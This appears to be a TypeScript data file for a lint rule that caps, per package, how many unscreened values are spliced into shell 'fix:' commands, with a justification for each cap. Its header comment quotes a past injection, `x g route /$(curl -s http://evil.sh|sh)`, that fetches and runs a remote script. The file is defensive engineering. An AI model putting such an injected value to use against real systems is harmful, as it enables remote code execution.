// The ratchet under `scripts/fix-shell-arg.ts`: how many `${…}` substitutions in each package sit
// in a SHELL COMMAND POSITION inside a `fix:` value, unscreened. The number may FALL and may never
// rise. Data only — the rule owns what it does with these.
//
// WHY A COUNT AND A SENTENCE. Every site pinned here is a claim that the value cannot carry shell
// syntax — usually because it is a literal this process wrote, or a name a schema already parsed.
// That claim holds exactly until the value arrives from a URL, a header, a database row or a file
// on disk, which is where the one that shipped came from: `x g route /$(curl -s http://evil.sh|sh)`
// was the rendered `fix:` for an unauthenticated GET against any unrouted path. The sentence is
// where a human says which side of that line a package's fix lines sit on.
//
// Shrink it with `bun run scripts/fix-shell-arg.ts --unpin <pkg>[,<pkg>]`, which lowers a count to
// what is measured and refuses to raise one. Raising a count is a hand edit, in a review.

/** Where the table lives, so a stale-pin finding can name the file to edit. */
export const FIX_SHELL_PINS_FILE = 'scripts/lib/fix-shell-arg-pins.ts';

export interface FixShellArgPin {
  /** How many sites this package is allowed to hold today. */
  readonly count: number;
  /** Why those values cannot carry shell syntax. Named sources, never "false positives". */
  readonly reason: string;
}

/**
 * Measured 2026-09-06, on the first run of the rule — the counts the command itself re-derives in
 * `data.counts`, so no number here is a claim `bun run fix-shell-arg --json` cannot check.
 *
 * `@ultimat3/core` is deliberately NOT absent: it holds `renderFixShellArg` and still splices
 * un-screened values of its own, which is the same shape as `@ultimat3/auth` holding
 * `timingSafeEqual` and — measured — being the one package with no `===` on a secret.
 */
export const FIX_SHELL_ARG_PINS: Readonly<Record<string, FixShellArgPin>> = {
  // 73 → 75: schema-drift.ts' repairFix splices db's own SchemaDifference.name into `x db gen`.
  // why: that name is a declared identifier or the fixed label `replica identity full`, never input.
  // why: +2 — framework-env.ts splices CURSOR_SECRET_KEY and STORAGE_SIGNING_SECRET_KEY, two
  // module constants naming env keys, into `export <KEY>="$(openssl rand -hex 32)"`; never runtime data.
  // why: 72 → 77 (31.28.0) — cmd-repro.ts' two already pass renderFixShellArg inside a conditional
  // the count cannot see into; guards.ts' three splice GUARD_DIR, the module constant `guards`.
  // 24 → 25: scaffold-first-run.ts' stepFinding still builds its `fix:` as one template —
  // `cd ${renderFixShellArg(dir, …)} && ${appBin(dir)} ${step.args.join(' ')}`. Main has since
  // rebuilt it as words quoted one by one, which erases the site; this branch was cut before that
  // rewrite landed, so the tree holds one more site than origin/main measured, not new debt.
  // why: `dir` is the app directory this process itself scaffolded — the finding's own `at:` —
  // never a request, a file's text or the network; the sentence the row's prose already states.
  // why: 24 → 27 (31.28.0) — the upgrade-fixtures harness: a cache dir under this checkout, a
  // mkdtemp dir this run made, and FIXTURE_VERSIONS, a module constant of release numbers.
  scripts: {
    count: 3,
    reason:
      "why: `lib/release-preflight.ts:40,53` splice `rerun`, a whole command `releaseInvocation` builds whose one free value, `--version`, has already passed `readReleaseVersion`'s semver check — no one-argument screen carries a command of several words; `roadmap.ts:170` joins literal paths from `REQUIRED_ARTIFACTS` in the same file. Every other scripts site was screened in plan 101b sweep 8b.",
  },
};
